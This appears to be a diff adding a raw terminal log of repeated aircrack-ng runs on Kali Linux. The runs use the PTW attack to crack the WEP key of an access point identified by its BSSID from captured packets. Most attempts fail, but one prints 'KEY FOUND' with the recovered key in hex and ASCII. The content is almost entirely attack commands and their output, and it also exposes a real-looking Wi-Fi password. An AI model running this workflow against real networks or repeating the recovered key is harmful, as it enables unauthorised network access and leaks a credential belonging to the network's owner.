@@ -1,0 +1,177 @@
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 35674 ivs.
+
+
+
+
+                                 Aircrack-ng 1.2 rc1
+
+
+                 [00:00:03] Tested 165244 keys (got 35674 IVs)
+
+   KB    depth   byte(vote)
+    0    6/  8   34(41984) 2F(41728) 4C(40960) 28(40704) 3B(40704) 
+    1   16/ 19   1C(41216) A0(40960) EE(40960) 56(40704) E2(40704) 
+    2   17/  2   F3(40448) F8(40192) 6B(39936) AB(39936) 08(39680) 
+    3   16/ 17   54(40704) 8B(40192) 12(39936) 89(39936) 0C(39680) 
+    4   67/  4   EE(37888) 16(37632) 95(37632) 9D(37632) A7(37632) 
+
+Failed. Next try with 40000 IVs.
+^C
+Quitting aircrack-ng...
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 42957 ivs.
+
+
+
+
+                                 Aircrack-ng 1.2 rc1
+
+
+                 [00:00:04] Tested 147925 keys (got 42957 IVs)
+
+   KB    depth   byte(vote)
+    0    4/  8   A0(50688) 0C(50432) 28(50432) 2F(50432) 87(50432) 
+    1   16/ 17   70(48896) 0A(48384) A8(48384) 6E(48128) A0(48128) 
+    2   13/ 14   9A(48896) 68(48640) EF(48640) 0D(48384) 5B(48384) 
+    3   14/  3   8B(48128) 0F(47872) 27(47872) C9(47872) D4(47872) 
+    4   58/  4   F6(45568) 13(45312) CA(45312) E8(45312) 05(45056) 
+
+Failed. Next try with 45000 IVs.
+^C
+Quitting aircrack-ng...
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 54467 ivs.
+
+
+
+
+                                 Aircrack-ng 1.2 rc1
+
+
+                 [00:00:01] Tested 1075686 keys (got 41799 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   76(59392) FF(51968) 83(50176) 73(49920) AD(48896) 
+    1    0/  1   69(54528) 4E(50176) 54(49664) 51(49408) 89(49408) 
+    2    6/  8   63(49152) E2(48896) F8(48128) EF(47872) F3(47872) 
+    3    1/  4   76(51200) 93(50944) 62(50688) ED(48896) 50(48640) 
+    4    0/  2   69(53504) 0B(50688) 72(49408) BF(48640) 9F(48384) 
+    5    0/  1   63(58624) 59(52480) 8C(51968) C5(51200) DA(51200) 
+    6    0/  4   6D(53248) F6(52224) 67(50944) AD(50432) CD(49664) 
+    7    0/  5   61(52992) 40(52992) 96(51200) 72(50688) FB(49920) 
+    8    0/ 18   72(50176) 28(49920) E7(49408) 9A(48896) 9C(48896) 
+    9    1/  2   74(52224) 0A(50944) 51(50944) 72(49664) 43(48640) 
+   10    1/  3   69(53248) F1(51200) 6B(50432) DD(48384) 13(48128) 
+   11    0/  1   6E(60928) 0A(50688) 4B(50176) 52(49152) 91(48896) 
+   12    6/  8   81(48640) 70(48384) 73(48128) 97(48128) A9(48128) 
+
+     KEY FOUND! [ 76:69:63:76:69:63:6D:61:72:74:69:6E:61 ] (ASCII: vicvicmartina )
+	Decrypted correctly: 100%
+
+
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 54527 ivs.
+
+
+                                      Aircrack-ng 1.2 rc1
+
+
+                      [00:00:08] Tested 152481 keys (got 54527 IVs)
+
+   KB    depth   byte(vote)
+    0    3/  4   FF(65536) 86(62464) 30(62208) 94(62208) C6(62208) 28(61952) 
+    1   23/ 25   19(59648) 01(59392) 09(59392) 56(59392) 71(59136) 73(59136) 
+    2   31/  2   FB(58880) 34(58368) 4D(58368) 4E(58368) 99(58368) A1(58368) 
+    3   22/ 26   00(59648) 33(59392) 68(59392) D4(59392) 2B(59136) 4F(59136) 
+    4   46/  4   FB(58112) 15(57856) 65(57856) 6E(57856) 98(57856) 9D(57856) 
+
+Failed. Next try with 55000 IVs.
+^C
+Quitting aircrack-ng...
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 54551 ivs.
+
+
+
+
+                                      Aircrack-ng 1.2 rc1
+
+
+                      [00:00:08] Tested 155777 keys (got 54551 IVs)
+
+   KB    depth   byte(vote)
+    0    3/  4   FF(65536) 86(62464) 30(62208) 94(62208) C6(62208) 28(61952) 
+    1   24/ 25   19(59648) 01(59392) 56(59392) 71(59136) 73(59136) 0B(58880) 
+    2   31/  2   FB(58880) 08(58368) 34(58368) 4D(58368) 4E(58368) 99(58368) 
+    3   22/ 25   00(59648) 33(59392) 68(59392) D4(59392) 2B(59136) 4B(59136) 
+    4   46/  4   FB(58112) 15(57856) 65(57856) 6E(57856) 98(57856) 9D(57856) 
+
+Failed. Next try with 55000 IVs.
+^C
+Quitting aircrack-ng...
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 54559 ivs.
+
+
+
+
+                                      Aircrack-ng 1.2 rc1
+
+
+                      [00:00:08] Tested 155777 keys (got 54559 IVs)
+
+   KB    depth   byte(vote)
+    0    3/  4   FF(65536) 86(62464) 30(62208) 94(62208) C6(62208) 28(61952) 
+    1   24/ 25   19(59648) 01(59392) 56(59392) 71(59136) 73(59136) 0B(58880) 
+    2   31/  2   FB(58880) 08(58368) 34(58368) 4D(58368) 4E(58368) 99(58368) 
+    3   22/ 25   00(59648) 33(59392) 68(59392) D4(59392) 2B(59136) 4B(59136) 
+    4   46/  4   FB(58112) 15(57856) 65(57856) 6E(57856) 98(57856) 9D(57856) 
+
+Failed. Next try with 55000 IVs.
+^C
+Quitting aircrack-ng...
+root@kali:~# aircrack-ng -b 38:22:9D:37:38:0C /root/Desktop/retewep/retewep-*.cap
+Opening /root/Desktop/retewep/retewep-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 54560 ivs.
+
+
+
+
+                                      Aircrack-ng 1.2 rc1
+
+
+                      [00:00:08] Tested 155777 keys (got 54560 IVs)
+
+   KB    depth   byte(vote)
+    0    3/  4   FF(65536) 86(62464) 30(62208) 94(62208) C6(62208) 28(61952) 
+    1   24/ 25   19(59648) 01(59392) 56(59392) 71(59136) 73(59136) 0B(58880) 
+    2   31/  2   FB(58880) 08(58368) 34(58368) 4D(58368) 4E(58368) 99(58368) 
+    3   22/ 25   00(59648) 33(59392) 68(59392) D4(59392) 2B(59136) 4B(59136) 
+    4   46/  4   FB(58112) 15(57856) 65(57856) 6E(57856) 98(57856) 9D(57856) 
+
+Failed. Next try with 55000 IVs.
+
+
+
+
+
+
+
+
+
+
+
